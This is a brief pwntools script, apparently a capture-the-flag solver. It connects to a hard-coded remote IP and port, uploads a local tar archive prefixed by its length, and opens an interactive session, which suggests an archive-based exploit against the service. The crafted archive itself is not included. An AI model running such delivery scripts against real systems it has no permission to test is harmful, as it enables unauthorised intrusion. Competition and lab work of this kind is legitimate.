#!/usr/bin/env python3
from pwn import *

r = remote('60.250.197.227', 11000)

tar = open('./test.tar', 'rb').read()
r.sendline(str(len(tar)))
r.send(tar)

r.interactive()
